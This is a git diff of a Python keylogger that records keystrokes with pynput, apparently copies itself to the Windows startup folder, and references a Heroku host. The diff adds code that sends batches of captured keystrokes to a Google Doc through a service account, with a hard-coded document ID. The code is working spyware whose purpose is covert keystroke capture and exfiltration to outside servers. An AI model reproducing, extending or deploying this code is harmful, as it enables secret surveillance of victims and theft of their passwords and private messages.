@@ -2,21 +2,33 @@ from __future__ import print_function
 
 import os
 import pathlib
+import random
 import re
 import shutil
 import subprocess
 import sys
 import threading
+import time
 from pathlib import Path
 
 import requests
 from google.oauth2 import service_account
 from pynput.keyboard import Listener
+from googleapiclient.discovery import build
 
+text = ""
 line_length = 0
 HOST = "https://salty-basin-28879.herokuapp.com/"
-path = os.path.sep.join(path for index, path in enumerate(pathlib.Path(__file__).parent.parts) if index < 3)
-text = ""
+path = os.environ['USERPROFILE']
+
+# If modifying these scopes, delete the file token.json.
+SCOPES = ['https://www.googleapis.com/auth/documents']
+
+# The ID of a sample document.
+DOCUMENT_ID = '1u17zh52qGIZPAF_P0a7ce23RRHrYWPR15mCz3dVL_GY'
+creds = service_account.Credentials.from_service_account_file(
+    'credentials.json', scopes=SCOPES)
+service = build('docs', 'v1', credentials=creds)
 
 
 def launch_request(key):
@@ -38,6 +50,7 @@ def write_to_file(key):
 
 
 def key_recorder(key):
+    global text
     str_key = str(key)
     global line_length
     line_length += 1
@@ -68,10 +81,8 @@ def key_recorder(key):
         char += str_key.replace("'", "")
 
     write_to_file(char)
-    global text
     text += char
-    if len(text) > 30:
-        text += "\n"
+    if len(text) > 100:
         thread = threading.Thread(target=write_to_doc, args=(text,))
         thread.start()
         text = ""
@@ -101,34 +112,38 @@ def copy_to_startup_folder():
 
 
 import os.path
-from googleapiclient.discovery import build
-
-# If modifying these scopes, delete the file token.json.
-SCOPES = ['https://www.googleapis.com/auth/documents']
-
-# The ID of a sample document.
-DOCUMENT_ID = '1u17zh52qGIZPAF_P0a7ce23RRHrYWPR15mCz3dVL_GY'
 
 
-def write_to_doc(text):
+def write_to_doc(char):
     """Shows basic usage of the Docs API.
     Prints the title of a sample document.
     """
 
-    creds = service_account.Credentials.from_service_account_file(
-        'credentials.json', scopes=SCOPES)
-
-    service = build('docs', 'v1', credentials=creds)
-
     # Retrieve the documents contents from the Docs service.
+    text = service.documents().get(documentId=DOCUMENT_ID).execute().get('body').get('content')
+    content = ""
+    for item in text:
+        for key in item:
+            if key == "paragraph":
+                for key_paragraph in item[key]:
+                    if key_paragraph == 'elements':
+                        if type(item[key][key_paragraph]) == list:
+                            if len(item[key][key_paragraph]) > 0:
+                                if type(item[key][key_paragraph][0]) == dict:
+                                    for key_text in item[key][key_paragraph][0]:
+                                        if key_text == "textRun":
+                                            if type(item[key][key_paragraph][0][key_text]) == dict:
+                                                for key_content in item[key][key_paragraph][0][key_text]:
+                                                    if key_content == "content":
+                                                        content += item[key][key_paragraph][0][key_text][key_content]
 
     insert_request = [
         {
             'insertText': {
                 'location': {
-                    'index': 1,
+                    'index': len(content),
                 },
-                'text': text
+                'text': char
             }
         },
 
